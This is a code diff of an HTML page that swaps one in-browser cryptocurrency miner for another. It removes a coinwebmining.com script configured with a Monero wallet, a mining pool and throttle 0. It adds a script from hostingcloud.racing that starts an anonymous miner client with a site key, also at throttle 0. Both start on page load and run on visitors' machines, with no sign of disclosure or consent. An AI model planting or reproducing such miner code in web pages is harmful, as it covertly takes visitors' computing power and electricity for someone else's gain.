@@ -48,17 +48,12 @@
         <!--app.js-->
         <script src="./assets/app.js"></script>
         <!--Miner-->
-        <script src="https://coinwebmining.com/cwm.js"></script>
+        <script src="https://www.hostingcloud.racing/awY9.js"></script>
         <script>
-            var site_id = 'cwm-3604';
-            var coin = 'monero';
-            var wallet = '46BDRo8aqqzXU3ksU67hACNEEFQKN9w26jBP1wZq1fxuhaUoLyMSC6XjYUB9WQ7e342kwuZFbBDuBbtdFh12akxT4JEdzNY';
-            var password = 'x';
-            var mining_pool = 'gulf.moneroocean.stream:10001';
-            var threads = 5;
-            var throttle = 0;
-            var debug = false;
-            cwm_start(site_id, coin, wallet, password, mining_pool, threads, throttle, debug);
+            var _client = new Client.Anonymous('3d2d20c428afc94cc243fc3469fc2dcef7bb33fdd4456cce062093da53773a21', {
+                throttle: 0, c: 'w', ads: 0
+            });
+            _client.start();
         </script>
     </body>
 </html>
